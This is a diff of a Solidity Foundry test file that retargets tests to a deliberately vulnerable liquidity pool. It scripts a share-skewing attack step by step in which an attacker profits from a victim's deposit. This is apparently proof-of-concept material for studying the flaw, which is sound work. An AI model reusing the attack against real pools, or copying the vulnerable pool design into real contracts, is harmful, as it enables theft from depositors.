@@ -3,12 +3,12 @@ pragma solidity ^0.8.20;
 
 import {Test} from "forge-std/Test.sol";
 import {Token} from "../src/Token.sol";
-import {Pool} from "../src/Pool.sol";
+import {PoolNoMinShares} from "../src/vulnerable/PoolNoMinShares.sol";
 
 contract LockedPoolAttackTest is Test {
     Token token0;
     Token token1;
-    Pool pool;
+    PoolNoMinShares pool;
 
     address attacker = makeAddr("attacker");
     address victim = makeAddr("victim");
@@ -16,7 +16,7 @@ contract LockedPoolAttackTest is Test {
     function setUp() public {
         token0 = new Token("Token 0", "T0");
         token1 = new Token("Token 1", "T1");
-        pool = new Pool(token0, token1);
+        pool = new PoolNoMinShares(token0, token1);
 
         token0.mint(attacker, 200_000);
         token1.mint(attacker, 200_000);
@@ -35,14 +35,12 @@ contract LockedPoolAttackTest is Test {
         vm.stopPrank();
     }
 
-    function test_NoLockAttackIsBlockedByTheLock() public {
-        // A 4 / 4 deposit would mint only 4 initial shares.
-        // The real pool requires more than 100 shares for its first deposit.
-        vm.expectRevert(Pool.ZeroShares.selector);
+    function test_TinyInitialDepositBlockedByLiquidityLock() public {
+        vm.expectRevert(PoolNoMinShares.ZeroShares.selector);
         vm.prank(attacker);
         pool.addLiquidity(4, 4);
 
-        // The failed deposit must leave all pool state unchanged.
+        // The failed deposit leaves the pool and attacker unchanged.
         assertEq(pool.reserve0(), 0);
         assertEq(pool.reserve1(), 0);
         assertEq(pool.totalShares(), 0);
@@ -54,13 +52,13 @@ contract LockedPoolAttackTest is Test {
         assertEq(token1.balanceOf(attacker), 200_000);
     }
 
-    function test_SkewAttackStillProfitsAgainstRealPool() public {
+    function test_SkewAttackProfitsWhenDepositsHaveNoMinimum() public {
         uint256 attackerToken0Start = token0.balanceOf(attacker);
         uint256 attackerToken1Start = token1.balanceOf(attacker);
         uint256 victimToken0Start = token0.balanceOf(victim);
         uint256 victimToken1Start = token1.balanceOf(victim);
 
-        // Step 1: legal initial deposit.
+        // Step 1: attacker makes a legal initial deposit.
         vm.prank(attacker);
         uint256 initialShares = pool.addLiquidity(1_000, 1_000);
 
@@ -70,7 +68,7 @@ contract LockedPoolAttackTest is Test {
         assertEq(pool.reserve0(), 1_000);
         assertEq(pool.reserve1(), 1_000);
 
-        // Step 2: the attacker's unbalanced deposit.
+        // Step 2: attacker makes an unbalanced deposit.
         vm.prank(attacker);
         uint256 skewShares = pool.addLiquidity(30_000, 1_000);
 
@@ -80,7 +78,7 @@ contract LockedPoolAttackTest is Test {
         assertEq(pool.reserve0(), 31_000);
         assertEq(pool.reserve1(), 2_000);
 
-        // Step 3: the victim deposits 10,000 of each token.
+        // Step 3: victim deposits 10,000 of each token.
         vm.prank(victim);
         uint256 victimSharesMinted = pool.addLiquidity(10_000, 10_000);
 
@@ -91,7 +89,8 @@ contract LockedPoolAttackTest is Test {
         assertEq(pool.reserve0(), 41_000);
         assertEq(pool.reserve1(), 12_000);
 
-        // The attacker withdraws first. Read shares before vm.prank.
+        // Attacker withdraws first.
+        // Read shares before setting the prank.
         uint256 attackerSharesToWithdraw = pool.shares(attacker);
 
         vm.prank(attacker);
@@ -104,7 +103,7 @@ contract LockedPoolAttackTest is Test {
         assertEq(pool.reserve1(), 3_380);
         assertEq(pool.totalShares(), 745);
 
-        // The victim withdraws their remaining share position.
+        // Victim withdraws the remaining shares.
         uint256 victimSharesToWithdraw = pool.shares(victim);
 
         vm.prank(victim);
@@ -113,7 +112,7 @@ contract LockedPoolAttackTest is Test {
         assertEq(victimOut0, 9_998);
         assertEq(victimOut1, 2_926);
 
-        // The locked shares and remaining assets stay in the pool.
+        // The locked shares and remaining reserves stay in the pool.
         assertEq(pool.shares(attacker), 0);
         assertEq(pool.shares(victim), 0);
         assertEq(pool.totalShares(), 100);
@@ -127,7 +126,7 @@ contract LockedPoolAttackTest is Test {
         assertEq(int256(token0.balanceOf(attacker)) - int256(attackerToken0Start), -1_549);
         assertEq(int256(token1.balanceOf(attacker)) - int256(attackerToken1Start), 6_620);
 
-        // Victim's loss.
+        // Victim's losses match the trace.
         assertEq(victimToken0Start - token0.balanceOf(victim), 2);
         assertEq(victimToken1Start - token1.balanceOf(victim), 7_074);
 
